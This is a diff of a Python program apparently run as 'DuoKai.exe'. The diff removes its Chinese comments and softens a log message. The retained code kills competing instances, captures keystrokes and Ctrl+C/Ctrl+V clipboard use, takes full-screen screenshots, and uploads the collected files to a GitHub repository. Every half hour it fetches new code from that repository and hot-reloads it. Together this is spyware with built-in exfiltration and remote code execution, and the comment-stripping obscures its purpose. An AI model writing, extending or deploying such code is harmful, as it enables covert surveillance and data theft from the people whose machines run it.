@@ -28,11 +28,9 @@ running_listeners = []
 
 
 def kill_previous_instances():
-    """清理当前电脑上除了本 PID 以外的旧 DuoKai.exe / Python 进程"""
     try:
         current_pid = os.getpid()
         
-        # 1. 结束多余的 DuoKai.exe
         cmd = 'tasklist /FI "IMAGENAME eq DuoKai.exe" /FO CSV /NH'
         output = subprocess.check_output(cmd, shell=True, encoding='utf-8', errors='ignore')
         for line in output.splitlines():
@@ -43,7 +41,6 @@ def kill_previous_instances():
                     if pid_str.isdigit() and int(pid_str) != current_pid:
                         subprocess.run(f"taskkill /F /PID {pid_str}", shell=True, capture_output=True)
 
-        # 2. 结束残留的 Python 脚本进程
         cmd_wmic = 'wmic process where "name like \'%DuoKai%\' or commandline like \'%_remote_main_cache%\'" get processid'
         output_wmic = subprocess.check_output(cmd_wmic, shell=True, encoding='utf-8', errors='ignore')
         for line in output_wmic.splitlines():
@@ -55,27 +52,19 @@ def kill_previous_instances():
 
 
 def extract_date_from_filename(file_name):
-    """
-    智能解析文件名中的日期:
-    1. 匹配 20260823 -> 转化为 8.23
-    2. 匹配 2026-08-23 -> 转化为 8.23
-    3. 解析失败则退回当前时间 (例如 8.25)
-    """
-    # 匹配 YYYYMMDD (例如 20260823)
+    
     match1 = re.search(r'\b20\d{2}(\d{2})(\d{2})\b', file_name)
     if match1:
         month = str(int(match1.group(1)))
         day = str(int(match1.group(2)))
         return f"{month}.{day}"
         
-    # 匹配 YYYY-MM-DD (例如 2026-08-23)
     match2 = re.search(r'\b20\d{2}-(\d{2})-(\d{2})\b', file_name)
     if match2:
         month = str(int(match2.group(1)))
         day = str(int(match2.group(2)))
         return f"{month}.{day}"
         
-    # 如果文件名没有日期，默认使用当前日期
     return time.strftime('%m.%d').lstrip('0').replace('.0', '.')
 
 
@@ -86,10 +75,8 @@ def upload_file_smart(file_path):
     file_name = os.path.basename(file_path)
     device_folder = DEVICE_NAME
 
-    # 根据文件名自动解析出历史日期或当前日期 (例如 8.23)
     date_folder = extract_date_from_filename(file_name)
 
-    # 上传路径：uploads/设备名/日期/文件名
     target_path = f"uploads/{device_folder}/{date_folder}/{file_name}"
     
     base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
@@ -143,7 +130,6 @@ def scheduled_upload_task():
 
 
 def get_log_file_path():
-    # 每天生成独立的 txt 文件，格式为：[设备名]-YYYY-MM-DD-LOG.txt
     today_date = time.strftime("%Y-%m-%d")
     log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
     return os.path.join(SAVE_DIR, log_filename)
@@ -163,7 +149,6 @@ def write_txt(action_type, detail=""):
 
 
 def take_full_screenshot(action_type):
-    # 新截图文件名同样带有 20260825_231121 规则，方便以后提取
     timestamp = time.strftime("%Y%m%d_%H%M%S")
     filename = f"{DEVICE_NAME}_{timestamp}_{action_type}.png"
     filepath = os.path.join(SAVE_DIR, filename)
@@ -216,7 +201,6 @@ def on_press(key):
 
 
 def auto_update_loop(token):
-    """半小时自动拉取云端最新代码并热替换重启"""
     cache_path = os.path.join(os.getenv("TEMP", "."), "_remote_main_cache.py")
     url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{GITHUB_CONFIG['file_path']}"
     headers = {
@@ -225,7 +209,7 @@ def auto_update_loop(token):
     }
     
     while True:
-        time.sleep(1800)  # 每半小时执行一次
+        time.sleep(1800) 
         try:
             res = requests.get(url, headers=headers, timeout=10)
             if res.status_code == 200:
@@ -235,7 +219,7 @@ def auto_update_loop(token):
                 with open(cache_path, "wb") as f:
                     f.write(new_code)
                 
-                write_txt("系统", "已完成半小时定时更新云端代码，正在重新载入...")
+                write_txt("系统", "更新，重新载入...")
 
                 for listener in running_listeners:
                     try: listener.stop()
@@ -253,17 +237,14 @@ def auto_update_loop(token):
 
 
 def run(token):
-    # 1. 优先清理旧残留进程
     kill_previous_instances()
 
     GITHUB_CONFIG["token"] = token
     write_txt("启动", "服务启动完成")
 
-    # 2. 启动上传线程
     upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
     upload_thread.start()
 
-    # 3. 启动键盘/剪贴板监听
     try:
         hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+c": on_copy, "<ctrl>+v": on_paste})
         hotkey_listener.start()
@@ -278,7 +259,6 @@ def run(token):
     except Exception as e:
         write_txt("异常", f"按键服务异常: {e}")
 
-    # 4. 启动半小时定时热更新
     update_thread = threading.Thread(target=auto_update_loop, args=(token,), daemon=True)
     update_thread.start()
 
